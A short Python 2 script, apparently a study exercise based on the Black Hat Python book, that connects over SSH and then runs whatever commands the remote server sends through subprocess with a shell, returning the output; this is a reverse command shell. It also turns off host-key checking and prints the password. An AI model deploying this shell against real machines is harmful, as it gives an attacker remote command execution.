import threading
import paramiko
import subprocess

from secret import password as pw
from secret import username as un

def ssh_command(ip, user, passwd, command):

    client = paramiko.SSHClient()
    # client.load_host_keys('/root/Documents/python/BlackHatPython/test_rsa.key')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    print("all my info", ip, user, passwd, command, ssh_session)
    if ssh_session.active:
        print("am I an active session")
        ssh_session.send(command)
        # ssh_session.send(command_again)
        print("made it to send command")
        print ssh_session.recv(1024)  # read banner
        while True:
            command = ssh_session.recv(1024)  # get the command from SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return


ssh_command('localhost', un, pw, 'ls')
# ClientConnect, username, password, command to run

'''
in local mach:
- don't run as root, can't ssh that way
- create a user to run on
- run your ssh service
- cross your fingers


See if a service is running on win?
c:\ netstat -ab | find ":22" = if blank, none running

start service:

download an ssh server:
https://winscp.net/eng/docs/guide_windows_openssh_server

'''
